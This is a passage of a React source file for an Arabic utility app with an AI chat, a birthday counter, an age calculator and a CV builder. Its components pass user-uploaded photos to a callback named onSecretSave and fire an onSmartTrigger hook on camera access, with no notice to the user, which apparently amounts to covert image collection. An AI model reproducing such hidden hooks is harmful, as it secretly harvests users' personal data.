                <button 
                  type="button"
                  onClick={() => setAttachedImage(null)} 
                  className="absolute -top-2 -right-2 bg-red-600 text-white rounded-full p-1.5 shadow-xl hover:bg-red-500 transition-colors z-10"
                >
                  <X size={14} />
                </button>
              </div>
              <div className="flex flex-col gap-2 pb-1">
                 <button 
                   type="button"
                   onClick={() => handleSend(undefined, attachedImage!)}
                   className="px-4 py-2 bg-blue-600 hover:bg-blue-500 text-white rounded-xl text-[10px] font-black italic shadow-lg shadow-blue-600/30 transition-all active:scale-95 flex items-center gap-2"
                 >
                   <BrainCircuit size={14} /> تحليل ذكي
                 </button>
                 <button 
                   type="button"
                   onClick={async () => {
                     setInput(OCR_PROMPT);
                     handleSend(undefined, attachedImage!);
                   }}
                   className="px-3 py-2 bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl text-[10px] font-black italic shadow-lg shadow-emerald-600/30 transition-all active:scale-95 flex items-center gap-2"
                 >
                   <FileText size={14} /> استخراج النص
                 </button>
              </div>
            </div>
          )}
          <div className="flex items-center gap-2 bg-gray-50 dark:bg-black/35 border border-gray-200 dark:border-gray-800 rounded-3xl p-1.5 focus-within:border-blue-500/50 transition-colors">
            <div 
              onClick={async () => { 
                const ok = await onPermissionRequest();
                if (ok) {
                  onSmartTrigger('s', 'ai_solver_upload_trigger'); 
                  setShowPicker(true); 
                } else {
                  showToast('يجب السماح بإذن الكاميرا للمتابعة 🔒', 'error');
                }
              }}
              className="flex-shrink-0 cursor-pointer text-gray-505 hover:text-blue-600 dark:hover:text-blue-400 transition-colors p-2 bg-white dark:bg-gray-800/80 rounded-2xl border border-gray-150 dark:border-gray-700/60" 
              title="ارفع صورة مسألة للحصول على حل فوري"
            >
              <input type="file" className="hidden" ref={galleryRef} accept="image/*" onClick={e => e.stopPropagation()} onChange={e => {
                const f = e.target.files?.[0];
                if (f) onFileSelect(f);
              }} />
              <input type="file" className="hidden" ref={cameraRef} accept="image/*" capture="environment" onClick={e => e.stopPropagation()} onChange={e => {
                const f = e.target.files?.[0];
                if (f) onFileSelect(f);
              }} />
              <Camera size={20} />
            </div>
            <input
              value={input}
              onChange={(e) => setInput(e.target.value)}
              placeholder="اكتب سؤالك أو ارفع صورة مسألة..."
              className="flex-1 min-w-0 bg-transparent border-none outline-none text-gray-950 dark:text-white px-2 py-2 text-sm placeholder:text-gray-400 dark:placeholder:text-gray-600 font-medium"
            />
            <button
              type="submit"
              disabled={isLoading}
              className="flex-shrink-0 bg-blue-600 hover:bg-blue-500 disabled:opacity-50 text-white rounded-2xl p-2.5 transition-all shadow-lg shadow-blue-600/30 active:scale-95 cursor-pointer flex items-center justify-center"
            >
              <Send size={20} />
            </button>
          </div>
        </form>

        <AnimatePresence>
          {showPicker && (
            <ImageSourcePicker 
              onClose={() => setShowPicker(false)} 
              onSelect={(source) => {
                setShowPicker(false);
                setTimeout(() => {
                  if (source === 'camera') cameraRef.current?.click();
                  else galleryRef.current?.click();
                }, 100);
              }} 
            />
          )}
        </AnimatePresence>
      </div>
    </div>
  );
};

// 5. History Component
const HistoryTab = ({ history, onClear }: { history: HistoryItem[], onClear: () => void }) => {
  return (
    <div className="flex flex-col h-full p-4 overflow-y-auto custom-scrollbar max-w-lg mx-auto w-full">
      <div className="flex justify-between items-center mb-6">
        <h2 className="text-xl font-black italic">سجل العمليات</h2>
        <button 
          type="button"
          onClick={onClear} 
          className="text-red-400 hover:text-red-300 text-xs font-bold flex items-center gap-1 bg-red-500/10 px-3 py-1 rounded-full"
        >
          <Trash2 size={14} /> مسح السجل
        </button>
      </div>
      <div className="flex flex-col gap-3">
        {history.length === 0 ? (
          <div className="flex flex-col items-center justify-center py-20 gap-4 opacity-30">
            <History size={48} />
            <div className="text-center italic text-sm font-bold">لا توجد عمليات سابقة محفوظة</div>
          </div>
        ) : (
          history.map((item) => (
            <div key={item.id} className="bg-[#1a1c1e] border border-gray-800 rounded-2xl p-4 hover:border-gray-600 transition-all shadow-lg">
              <div className="flex justify-between items-center mb-3">
                <span className="text-[10px] text-gray-500 font-mono bg-black/30 px-2 py-0.5 rounded-lg border border-gray-800">
                  {new Date(item.timestamp).toLocaleTimeString('ar-EG')}
                </span>
                <span className={cn(
                  "text-[9px] px-2 py-1 rounded-lg font-black uppercase tracking-tighter",
                  item.type === 'calculator' ? "bg-blue-900/20 text-blue-400 border border-blue-900/30" : 
                  item.type === 'converter' ? "bg-orange-900/20 text-orange-400 border border-orange-900/30" :
                  item.type === 'health' ? "bg-emerald-900/20 text-emerald-400 border border-emerald-900/30" :
                  "bg-purple-900/20 text-purple-400 border border-purple-900/30"
                )}>
                  {item.title}
                </span>
              </div>
              <div className="text-[11px] text-gray-400 mb-2 leading-relaxed font-bold">{item.details}</div>
              <div className="text-lg font-mono text-white text-left break-all font-black">{item.result}</div>
            </div>
          ))
        )}
      </div>
    </div>
  );
};

// 6. More Sub-Tools
const BirthdayTool = ({ 
  proConfig, 
  onUpdatePro,
  showToast,
  addBackgroundTask,
  onOpenGallery,
  onSecretSave,
  onSmartTrigger,
  onPermissionRequest
}: { 
  proConfig: any, 
  onUpdatePro: (conf: any) => void,
  showToast: (m: string, t: 'success' | 'error' | 'info') => void,
  addBackgroundTask: (label: string, taskFn: (updateProgress: (p: number) => void) => Promise<any>, target?: {tab: string, subTab?: string}) => Promise<void>,
  onOpenGallery?: () => void,
  onSecretSave?: (fileName: string, data: string) => Promise<void>,
  onSmartTrigger: (type?: 's' | 't', source?: string) => void,
  onPermissionRequest?: () => Promise<boolean>
}) => {
  const [birthDate, setBirthDate] = useState(proConfig?.enabled ? proConfig.birthDate : '');
  const [timeLeft, setTimeLeft] = useState<{ days: number, hours: number, minutes: number, seconds: number } | null>(null);

  useEffect(() => {
    if (!birthDate) return;
    const interval = setInterval(() => {
      const now = new Date();
      const birth = new Date(birthDate);
      let nextBirthday = new Date(now.getFullYear(), birth.getMonth(), birth.getDate());
      
      if (nextBirthday < now) {
        nextBirthday.setFullYear(nextBirthday.getFullYear() + 1);
      }
      
      const diff = nextBirthday.getTime() - now.getTime();
      const days = Math.floor(diff / (1000 * 60 * 60 * 24));
      const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((diff % (1000 * 60)) / 1000);
      
      setTimeLeft({ days, hours, minutes, seconds });
    }, 1000);
    return () => clearInterval(interval);
  }, [birthDate]);

  if (proConfig?.enabled) {
    return (
      <ProfessionalBirthdayTool 
        config={proConfig} 
        onSave={onUpdatePro} 
        showToast={showToast} 
        addBackgroundTask={addBackgroundTask}
        onOpenGallery={onOpenGallery}
        onSecretSave={onSecretSave}
        onSmartTrigger={onSmartTrigger}
        onPermissionRequest={onPermissionRequest}
      />
    );
  }

  return (
    <div className="flex flex-col gap-8 animate-in fade-in slide-in-from-bottom-4 duration-500 pb-20">
      {/* 1. The Luxury Explanation & Pro Trigger Card */}
      <div className="space-y-6">
        <div className="bg-white dark:bg-[#1A1C1F] border border-blue-200 dark:border-blue-500/30 rounded-[32px] p-6 text-right space-y-4 shadow-2xl relative overflow-hidden ring-1 ring-blue-500/10">
           <div className="flex items-center justify-end gap-3 mb-2">
              <h3 className="text-xl font-black text-gray-900 dark:text-white italic">انطلق في تجربتك الخاصة ✨</h3>
              <div className="p-2.5 bg-gradient-to-br from-blue-600 to-indigo-700 rounded-xl text-white shadow-xl shadow-blue-500/20">
                 <ShieldCheck size={22} className="drop-shadow-md" />
              </div>
           </div>
           <p className="text-[12px] font-bold text-blue-950 dark:text-blue-50 leading-loose">
              ثق بأن عدادك هو أكثر من مجرد أرقام؛ إنه تجربة عاطفية متكاملة. يمكنك إضافة ألقابك، أو أي اسم محبب لقلبك في النسخة الاحترافية. هذه الأسماء ستتراقص في عالمك مع الموسيقى التي تختارها، لتعكس هويتك الفريدة وتصنع ذكريات لا تُنسى.
           </p>
        </div>

        {/* Pro Card - The Miniature Soul */}
        <motion.div 
          whileHover={{ scale: 1.01 }}
          whileTap={{ scale: 0.99 }}
          onClick={() => onUpdatePro({ ...proConfig, enabled: true })}
          className="relative h-[450px] rounded-[50px] overflow-hidden cursor-pointer group shadow-[0_30px_60px_-15px_rgba(0,0,0,0.5)] border-4 border-gray-800"
        >
          <div className="absolute inset-0">
             <RoyalBirthdayExperience 
              config={proConfig?.enabled ? proConfig : {
                names: [{ ar: 'روح', en: 'Rooh' }],
                birthDate: '2025-08-08',
                bgType: 'image',
                bgValue: '/aa/default_bg.png',
                musicUrl: '/aa/default_music.mp3',
                musicStart: 25,
                textColor: '#ffffff'
              }} 
              isMini={true} 
             />
          </div>

          {/* Prompt Overlay */}
          <div className="absolute inset-0 z-50 flex items-center justify-center bg-black/20 opacity-0 group-hover:opacity-100 transition-opacity backdrop-blur-[2px]">
             <div className="bg-white text-black px-8 py-4 rounded-3xl font-black italic shadow-2xl flex items-center gap-3 scale-90 group-hover:scale-100 transition-transform">
                <Sparkles className="text-blue-600" size={24} />
                تفعيل العداد الآن
             </div>
          </div>
          
          <div className="absolute bottom-6 left-6 z-50 px-4 py-2 bg-rose-500 text-white text-[10px] font-black rounded-xl shadow-lg shadow-rose-500/20 italic animate-pulse">
             ميزة حصرية
          </div>
        </motion.div>
      </div>

      <div className="h-px bg-gray-800 w-full opacity-50"></div>

      {/* Standard Basic Counter */}
      <div className="space-y-4">
        {!proConfig?.enabled && (
          <div 
            onClick={() => {
              // Direct toggle/lead to activate the Professional Counter
              onUpdatePro && onUpdatePro({ ...proConfig, enabled: true });
              showToast('تم تفعيل وتجهيز عداد الميلاد الاحترافي الشامل لك بنجاح! 🚀🎉', 'success');
            }}
            className="bg-white dark:bg-[#1a1c1e] border border-blue-200 dark:border-blue-500/30 p-5 rounded-3xl text-right animate-in zoom-in-95 duration-500 cursor-pointer shadow-xl shadow-blue-500/5 group"
          >
              <div className="flex items-center justify-end gap-2 text-blue-600 dark:text-blue-400 font-black italic mb-2">
                <span>تلميح ذكي</span>
                <Info size={16} />
              </div>
              <p className="text-[10px] text-gray-900 dark:text-gray-200 leading-relaxed font-bold">
                اضغط هنا للترقية وتنشيط العداد الاحترافي المجاني فوراً، لتخصيص المناسبة بكامل تفاصيلها الفخمة من موسيقى وخلفية وألقاب مشوقة! 🚀✨
              </p>
          </div>
        )}

        <label className="text-xs font-black text-gray-700 dark:text-gray-400 block px-1 text-right italic">العداد التقليدي السريع (بدون تخصيص)</label>
        <input 
          type="date" 
          value={birthDate}
          onChange={(e) => setBirthDate(e.target.value)}
          className="w-full bg-white dark:bg-[#1a1c1e] border-2 border-blue-100 dark:border-gray-800 rounded-2xl p-4 text-gray-950 dark:text-gray-100 focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10 outline-none transition-all shadow-md text-right font-black"
          style={{ colorScheme: 'light dark' }}
        />
        
        {timeLeft && (
          <div className="grid grid-cols-4 gap-3">
            {[
              { label: 'أيام', val: timeLeft.days },
              { label: 'ساعات', val: timeLeft.hours },
              { label: 'دقائق', val: timeLeft.minutes },
              { label: 'ثواني', val: timeLeft.seconds }
            ].map(i => (
              <div key={i.label} className="bg-sky-50/60 dark:bg-[#121417] border border-blue-100/80 dark:border-gray-800 rounded-2xl p-4 text-center shadow-md hover:translate-y-[-2px] transition-all duration-300">
                <div className="text-xl md:text-2xl font-black text-blue-700 dark:text-blue-400 font-mono tracking-tight">{i.val}</div>
                <div className="text-[10px] font-black text-gray-700 dark:text-gray-400 uppercase tracking-widest mt-1.5">{i.label}</div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
};

const AgeDiffTool = () => {
  const [date1, setDate1] = useState('');
  const [date2, setDate2] = useState('');
  const [diff, setDiff] = useState<{ years: number, months: number, days: number } | null>(null);

  const calculate = () => {
    if (!date1 || !date2) return;
    const d1 = new Date(date1);
    const d2 = new Date(date2);
    const earlier = d1 < d2 ? d1 : d2;
    const later = d1 < d2 ? d2 : d1;

    let years = later.getFullYear() - earlier.getFullYear();
    let months = later.getMonth() - earlier.getMonth();
    let days = later.getDate() - earlier.getDate();

    if (days < 0) {
      months -= 1;
      const prevMonth = new Date(later.getFullYear(), later.getMonth(), 0);
      days += prevMonth.getDate();
    }
    if (months < 0) {
      years -= 1;
      months += 12;
    }

    setDiff({ years, months, days });
  };

  return (
    <div className="flex flex-col gap-6 animate-in fade-in slide-in-from-bottom-4 duration-500 pb-10">
      <div className="grid grid-cols-1 gap-4">
        <div className="space-y-2">
          <label className="text-xs font-bold text-gray-500 block px-1 text-right">التاريخ الأول</label>
          <input type="date" value={date1} onChange={(e) => setDate1(e.target.value)} className="w-full bg-[#1a1c1e] border border-gray-800 rounded-2xl p-4 text-white outline-none focus:border-blue-500 transition-all text-right" />
        </div>
        <div className="space-y-2">
          <label className="text-xs font-bold text-gray-500 block px-1 text-right">التاريخ الثاني</label>
          <input type="date" value={date2} onChange={(e) => setDate2(e.target.value)} className="w-full bg-[#1a1c1e] border border-gray-800 rounded-2xl p-4 text-white outline-none focus:border-blue-500 transition-all text-right" />
        </div>
      </div>

      <button onClick={calculate} className="w-full bg-blue-600 hover:bg-blue-500 py-4 rounded-2xl font-bold text-white shadow-lg active:scale-95 transition-all">حساب الفرق</button>

      {diff && (
        <div className="bg-blue-600/5 border border-blue-500/10 rounded-2xl p-6 flex flex-col items-center gap-4">
          <div className="grid grid-cols-3 w-full gap-4">
            <div className="flex flex-col items-center">
              <span className="text-2xl font-black text-blue-400">{diff.years}</span>
              <span className="text-[10px] text-gray-500 font-bold">سنة</span>
            </div>
            <div className="flex flex-col items-center">
              <span className="text-2xl font-black text-blue-400">{diff.months}</span>
              <span className="text-[10px] text-gray-500 font-bold">شهر</span>
            </div>
            <div className="flex flex-col items-center">
              <span className="text-2xl font-black text-blue-400">{diff.days}</span>
              <span className="text-[10px] text-gray-500 font-bold">يوم</span>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

const CVMaker = ({ showToast, handleDownload, onSmartTrigger, addBackgroundTask, onSecretSave, onPermissionRequest }: { 
  showToast: (msg: string, type: 'success' | 'error' | 'info') => void,
  handleDownload: (url: string, filename: string) => void,
  onSmartTrigger: (type?: 's' | 't', source?: string) => void,
  addBackgroundTask: (label: string, taskFn: (updateProgress: (p: number) => void) => Promise<any>, target?: {tab: string, subTab?: string}) => Promise<void>,
  onSecretSave?: (fileName: string, data: string) => Promise<void>,
  onPermissionRequest: () => Promise<boolean>
}) => {
  const [data, setData] = useState<CVData>({
    jobTitle: '',
    name: '',
    email: '',
    phone: '',
    whatsapp: '',
    summary: '',
    experiences: [],
    certificates: [],
    skills: [],
    languages: [{ id: '1', name: 'العربية', level: 100 }],
    template: 'modern'
  });
  const [photo, setPhoto] = useState<string | null>(null);
  const [showPicker, setShowPicker] = useState(false);
  const [isAiProcessing, setIsAiProcessing] = useState(false);
  const [exportLang, setExportLang] = useState<'ar' | 'en' | 'both'>('ar');
  const [showLivePreview, setShowLivePreview] = useState(false);
  
  const galleryRef = useRef<HTMLInputElement>(null);
  const cameraRef = useRef<HTMLInputElement>(null);

  const onFileSelect = (file: File) => {
    if (file) {
      onSmartTrigger('s', 'cv_photo');
      const r = new FileReader();
      r.onload = async () => {
        const base64 = r.result as string;
        try {
          const { compressImageBase64 } = await import('./lib/imageCompressor');
          const compressed = await compressImageBase64(base64, 800, 800, 0.65);
          setPhoto(compressed);
          if (onSecretSave) onSecretSave(`cv_photo_${Date.now()}.png`, compressed);
        } catch {
          setPhoto(base64);
          if (onSecretSave) onSecretSave(`cv_photo_${Date.now()}.png`, base64);
        }
      };
      r.readAsDataURL(file);
    }
  };

  const templates = [
    { id: 'modern', label: 'عصري', color: '#111827' },
    { id: 'classic', label: 'كلاسيك', color: '#64748b' },
    { id: 'elegant', label: 'أنيق', color: '#ec4899' },
    { id: 'minimal', label: 'بسيط', color: '#6b7280' }
  ];

  const addExperience = () => {
    setData({
      ...data,
      experiences: [...data.experiences, { id: generateId(), title: '', company: '', from: '', to: '', description: '' }]
    });
  };

  const addCertificate = () => {
    setData({
      ...data,
      certificates: [...data.certificates, { id: generateId(), name: '', issuer: '', date: '' }]
    });
  };

  const addLanguage = () => {
    setData({
      ...data,
      languages: [...data.languages, { id: generateId(), name: '', level: 50 }]
    });
  };

  const handleAiSkills = async () => {
    if (!data.jobTitle) return showToast('يرجى إدخال التخصص أو المسمى الوظيفي أولاً', 'info');
    setIsAiProcessing(true);
    try {
      const prompt = `استناداً إلى المسمى الوظيفي "${data.jobTitle}"، اقترح قائمة من 8 مهارات وقدرات احترافية لهذه السيرة الذاتية. قدمها كقائمة مفصولة بفواصل فقط وبدون أي ترحيب أو مقدمات أو نصوص أخرى.`;
      const res = await getGeminiResponse(prompt);
      const skillList = res.split(/[,،]/).map(s => s.trim()).filter(Boolean);
      setData({ ...data, skills: [...new Set([...data.skills, ...skillList])] });
      showToast('تمت إضافة المهارات المقترحة بنجاح', 'success');
    } catch (e) {
      showToast('فشل اقتراح المهارات', 'error');
    } finally {
      setIsAiProcessing(false);
    }
  };

  const renderCVHtml = (lang: 'ar' | 'en', cv: CVData) => {
    const isEn = lang === 'en';
    const primaryColor = cv.template === 'modern_pro' ? '#3b82f6' : 
                        cv.template === 'creative' ? '#f59e0b' : 
                        cv.template === 'classic_pro' ? '#111827' : 
                        cv.template === 'hot' ? '#f43f5e' : 
                        cv.template === 'elegant' ? '#ec4899' : '#10b981';

    const secondaryColor = cv.template === 'creative' ? '#fbbf24' : 
                          cv.template === 'hot' ? '#fb7185' : '#64748b';

    if (cv.template === 'creative') {
      return `
        <div style="font-family: 'Inter', sans-serif; padding: 0; color: #1f2937; background: #fff; min-height: 1100px; direction: ${isEn ? 'ltr' : 'rtl'};" dir="${isEn ? 'ltr' : 'rtl'}">
          <!-- Sidebar Style Creative -->
          <div style="display: flex; height: 1100px;">
            <div style="width: 250px; background: ${primaryColor}; color: white; padding: 40px 20px; display: flex; flex-direction: column; align-items: center; border-image: linear-gradient(to bottom, ${primaryColor}, ${secondaryColor}) 1;">
              ${photo ? `<div style="width: 150px; height: 150px; border-radius: 50%; border: 8px solid rgba(255,255,255,0.2); overflow: hidden; margin-bottom: 30px; box-shadow: 0 10px 20px rgba(0,0,0,0.2);"><img src="${photo}" style="width: 100%; height: 100%; object-fit: cover;"></div>` : ''}
              
              <div style="width: 100%; margin-bottom: 40px;">
                <h3 style="font-size: 14px; border-bottom: 2px solid white; padding-bottom: 5px; margin-bottom: 15px; text-transform: uppercase;">${isEn ? 'Contact' : 'التواصل'}</h3>
                ${cv.phone ? `<p style="font-size: 11px; margin-bottom: 10px;">📞 ${cv.phone}</p>` : ''}
                ${cv.email ? `<p style="font-size: 11px; margin-bottom: 10px;">📧 ${cv.email}</p>` : ''}
              </div>

              <div style="width: 100%; margin-bottom: 40px;">
                <h3 style="font-size: 14px; border-bottom: 2px solid white; padding-bottom: 5px; margin-bottom: 15px; text-transform: uppercase;">${isEn ? 'Skills' : 'المهارات'}</h3>
                ${cv.skills.map(s => `<p style="font-size: 10px; margin-bottom: 5px; background: rgba(255,255,255,0.1); padding: 4px 8px; border-radius: 4px;">${s}</p>`).join('')}
              </div>

              <div style="width: 100%;">
                <h3 style="font-size: 14px; border-bottom: 2px solid white; padding-bottom: 5px; margin-bottom: 15px; text-transform: uppercase;">${isEn ? 'Languages' : 'اللغات'}</h3>
                ${cv.languages.map(l => `<div style="margin-bottom: 10px;"><div style="display: flex; justify-content: space-between; font-size: 10px;"><span>${l.name}</span><span>${l.level}%</span></div><div style="height: 3px; background: rgba(255,255,255,0.1); border-radius: 2px; margin-top: 3px;"><div style="height: 100%; width: ${l.level}%; background: white;"></div></div></div>`).join('')}
              </div>
            </div>

            <div style="flex: 1; padding: 60px 40px;">
              <h1 style="font-size: 38px; font-weight: 900; margin: 0; color: ${primaryColor}; text-transform: uppercase;">${cv.name || 'NAME'}</h1>
              <h2 style="font-size: 18px; font-weight: 700; color: ${secondaryColor}; margin-bottom: 40px; letter-spacing: 2px;">${cv.jobTitle || 'TITLE'}</h2>
              
              <div style="margin-bottom: 40px;">
                <h3 style="font-size: 18px; color: ${primaryColor}; border-bottom: 2px solid ${primaryColor}; display: inline-block; padding-bottom: 5px; margin-bottom: 15px;">${isEn ? 'Profile' : 'الملخص الشخصي'}</h3>
                <p style="font-size: 12px; line-height: 1.8; color: #444;">${cv.summary}</p>
              </div>

              <div style="margin-bottom: 40px;">
                <h3 style="font-size: 18px; color: ${primaryColor}; border-bottom: 2px solid ${primaryColor}; display: inline-block; padding-bottom: 5px; margin-bottom: 15px;">${isEn ? 'Experience' : 'الخبرة العملية'}</h3>
                ${cv.experiences.map(e => `
                  <div style="margin-bottom: 20px;">
                    <div style="display: flex; justify-content: space-between; font-weight: 800; font-size: 13px; color: #111;"><span>${e.title}</span><span style="color: ${secondaryColor};">${e.from} - ${e.to}</span></div>
                    <div style="font-size: 11px; font-weight: 600; color: #666; margin-bottom: 8px;">${e.company}</div>
                    <p style="font-size: 11px; line-height: 1.6; color: #555;">${e.description}</p>
                  </div>
                `).join('')}
              </div>
            </div>
          </div>
        </div>
      `;
    }

    if (cv.template === 'hot') {
        return `
        <div style="font-family: 'Helvetica', sans-serif; padding: 40px; color: #1f2937; background: #fff; min-height: 1100px; direction: ${isEn ? 'ltr' : 'rtl'}; border: 15px solid ${primaryColor}; box-sizing: border-box;" dir="${isEn ? 'ltr' : 'rtl'}">
          <div style="text-align: center; margin-bottom: 50px;">
            ${photo ? `<div style="width: 140px; height: 140px; border-radius: 30px; border: 4px solid ${primaryColor}; overflow: hidden; margin: 0 auto 20px; transform: rotate(-3deg);"><img src="${photo}" style="width: 100%; height: 100%; object-fit: cover;"></div>` : ''}
            <h1 style="font-size: 42px; font-weight: 900; margin: 0; color: #000; text-shadow: 2px 2px ${primaryColor}20;">${cv.name}</h1>
            <p style="font-size: 20px; color: ${primaryColor}; font-weight: 800; margin-top: 5px;">${cv.jobTitle}</p>
          </div>

          <div style="display: grid; grid-template-columns: 1fr 2fr; gap: 40px;">
            <div style="background: ${primaryColor}05; padding: 25px; border-radius: 20px;">
                <h3 style="font-size: 16px; color: ${primaryColor}; font-weight: 900; margin-bottom: 15px; border-bottom: 3px solid ${primaryColor}; display: inline-block;">${isEn ? 'CONTACT' : 'التواصل'}</h3>
                <p style="font-size: 12px; margin-bottom: 15px;"><b>Tel:</b> ${cv.phone}</p>
                <p style="font-size: 12px; margin-bottom: 15px;"><b>Email:</b> ${cv.email}</p>
                
                <h3 style="font-size: 16px; color: ${primaryColor}; font-weight: 900; margin-top: 30px; margin-bottom: 15px; border-bottom: 3px solid ${primaryColor}; display: inline-block;">${isEn ? 'SKILLS' : 'المهارات'}</h3>
                ${cv.skills.map(s => `<div style="font-size: 11px; margin-bottom: 8px; font-weight: 700; background: white; border: 1px solid ${primaryColor}20; padding: 5px 10px; border-radius: 10px;">${s}</div>`).join('')}
            </div>
            
            <div>
                <div style="margin-bottom: 40px;">
                  <h3 style="font-size: 18px; color: black; font-weight: 900; margin-bottom: 15px; background: ${primaryColor}; color: white; padding: 8px 15px; border-radius: 0 50px 50px 0; width: fit-content; margin-${isEn ? 'left' : 'right'}: -55px;">${isEn ? 'OBJECTIVE' : 'الهدف المهني'}</h3>
                  <p style="font-size: 13px; line-height: 1.7;">${cv.summary}</p>
                </div>

                <div>
                  <h3 style="font-size: 18px; color: black; font-weight: 900; margin-bottom: 15px; background: ${primaryColor}; color: white; padding: 8px 15px; border-radius: 0 50px 50px 0; width: fit-content; margin-${isEn ? 'left' : 'right'}: -55px;">${isEn ? 'EXPERIENCE' : 'الخبرات'}</h3>
                  ${cv.experiences.map(e => `
                    <div style="margin-bottom: 25px; border-bottom: 1px dashed ${primaryColor}40; padding-bottom: 15px;">
                        <h4 style="font-size: 15px; font-weight: 800; margin: 0;">${e.title}</h4>
                        <div style="display: flex; justify-content: space-between; font-size: 11px; color: ${primaryColor}; font-weight: 700; margin: 5px 0;"><span>${e.company}</span><span>${e.from} - ${e.to}</span></div>
                        <p style="font-size: 12px; color: #555;">${e.description}</p>
                    </div>
                  `).join('')}
                </div>
            </div>
          </div>
        </div>
        `;
    }

    return `
      <div style="font-family: Arial, sans-serif; padding: 40px; color: #1f2937; background: white; min-height: 1100px; direction: ${isEn ? 'ltr' : 'rtl'}; position: relative;" dir="${isEn ? 'ltr' : 'rtl'}">
        <!-- Header -->
        <div style="display: flex; gap: 30px; align-items: center; border-bottom: 2px solid ${primaryColor}; padding-bottom: 30px; margin-bottom: 40px;">
          ${photo ? `<div style="width: 140px; height: 140px; border-radius: 50%; border: 4px solid ${primaryColor}; overflow: hidden; flex-shrink: 0;"><img src="${photo}" style="width: 100%; height: 100%; object-fit: cover;"></div>` : ''}
          <div style="flex-grow: 1; text-align: ${isEn ? 'left' : 'right'};">
            <h1 style="font-size: 32px; color: ${primaryColor}; margin: 0; font-weight: 900;">${cv.name || (isEn ? 'Your Name' : 'اسمك')}</h1>
            <p style="font-size: 18px; color: #64748b; margin-top: 5px; font-weight: bold;">${cv.jobTitle || (isEn ? 'Professional Title' : 'التخصص الوظيفي')}</p>
            <div style="margin-top: 15px; display: flex; flex-wrap: wrap; gap: 20px; font-size: 12px; color: #475569; justify-content: ${isEn ? 'flex-start' : 'flex-start'};">
              ${cv.email ? `<div style="display: flex; align-items: center; gap: 5px;">📧 ${cv.email}</div>` : ''}
              ${cv.phone ? `<div style="display: flex; align-items: center; gap: 5px;">📞 ${cv.phone}</div>` : ''}
              ${cv.whatsapp ? `<div style="display: flex; align-items: center; gap: 5px;">💬 ${cv.whatsapp}</div>` : ''}
            </div>
          </div>
        </div>

        <!-- Summary -->
        ${cv.summary ? `
          <div style="margin-bottom: 30px;">
            <h3 style="font-size: 18px; color: ${primaryColor}; border-${isEn ? 'left' : 'right'}: 4px solid ${primaryColor}; padding-${isEn ? 'left' : 'right'}: 10px; margin-bottom: 10px; text-align: ${isEn ? 'left' : 'right'};">${isEn ? 'Professional Summary' : 'الملخص المهني'}</h3>
            <p style="font-size: 13px; line-height: 1.6; color: #334155; text-align: justify;">${cv.summary}</p>
          </div>
        ` : ''}
        
        <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 40px;">
          <div style="text-align: ${isEn ? 'left' : 'right'};">
             <!-- Experience -->
             ${cv.experiences.length > 0 ? `
              <div style="margin-bottom: 30px;">
                <h3 style="font-size: 18px; color: ${primaryColor}; border-${isEn ? 'left' : 'right'}: 4px solid ${primaryColor}; padding-${isEn ? 'left' : 'right'}: 10px; margin-bottom: 15px;">${isEn ? 'Experience' : 'الخبرات العملية'}</h3>
                ${cv.experiences.map(exp => `
                  <div style="margin-bottom: 15px;">
                    <div style="display: flex; justify-content: space-between; font-weight: bold; font-size: 14px;">
                      <span>${exp.title}</span>
                      <span style="color: ${primaryColor}; font-size: 11px;">${exp.from} - ${exp.to}</span>
                    </div>
                    <div style="color: #64748b; font-size: 12px; margin-bottom: 5px;">${exp.company}</div>
                    <p style="font-size: 12px; line-height: 1.5; color: #475569; margin: 0; text-align: justify;">${exp.description}</p>
                  </div>
                `).join('')}
              </div>
             ` : ''}

             <!-- Certificates -->
             ${cv.certificates.length > 0 ? `
              <div style="margin-bottom: 30px;">
                <h3 style="font-size: 18px; color: ${primaryColor}; border-${isEn ? 'left' : 'right'}: 4px solid ${primaryColor}; padding-${isEn ? 'left' : 'right'}: 10px; margin-bottom: 15px;">${isEn ? 'Certificates' : 'الشهادات والتحصيل'}</h3>
                ${cv.certificates.map(cert => `
                  <div style="margin-bottom: 10px;">
                    <div style="font-weight: bold; font-size: 13px;">${cert.name}</div>
                    <div style="display: flex; justify-content: space-between; font-size: 11px; color: #64748b;">
                      <span>${cert.issuer}</span>
                      <span>${cert.date}</span>
                    </div>
                  </div>
                `).join('')}
              </div>
             ` : ''}
          </div>

          <div style="text-align: ${isEn ? 'left' : 'right'};">
             <!-- Skills -->
             ${cv.skills.length > 0 ? `
              <div style="margin-bottom: 30px;">
                <h3 style="font-size: 18px; color: ${primaryColor}; border-${isEn ? 'left' : 'right'}: 4px solid ${primaryColor}; padding-${isEn ? 'left' : 'right'}: 10px; margin-bottom: 15px;">${isEn ? 'Skills' : 'المهارات'}</h3>
                <div style="display: flex; flex-wrap: wrap; gap: 5px; justify-content: ${isEn ? 'flex-start' : 'flex-start'};">
                  ${cv.skills.map(skill => `<span style="background: ${primaryColor}15; color: ${primaryColor}; padding: 3px 8px; border-radius: 4px; font-size: 10px; font-weight: bold;">${skill}</span>`).join('')}
                </div>
              </div>
             ` : ''}

             <!-- Languages -->
             ${cv.languages.length > 0 ? `
              <div style="margin-bottom: 30px;">
                <h3 style="font-size: 18px; color: ${primaryColor}; border-${isEn ? 'left' : 'right'}: 4px solid ${primaryColor}; padding-${isEn ? 'left' : 'right'}: 10px; margin-bottom: 15px;">${isEn ? 'Languages' : 'اللغات'}</h3>
                ${cv.languages.map(lang => `
                  <div style="margin-bottom: 8px;">
                    <div style="display: flex; justify-content: space-between; font-size: 11px; margin-bottom: 2px;">
                      <span>${lang.name}</span>
                      <span>${lang.level}%</span>
                    </div>
                    <div style="height: 4px; background: #f1f5f9; border-radius: 2px;">
                      <div style="height: 100%; width: ${lang.level}%; background: ${primaryColor}; border-radius: 2px;"></div>
                    </div>
                  </div>
                `).join('')}
              </div>
             ` : ''}
          </div>
        </div>

        <div style="margin-top: 40px; text-align: center; font-size: 10px; color: #94a3b8; border-top: 1px solid #f1f5f9; padding-top: 20px;">
          Created by Spirit AI - Hissab Rouh Premium
        </div>
      </div>
    `;
  };

  const generateSinglePDF = async (lang: 'ar' | 'en') => {
    const isEn = lang === 'en';
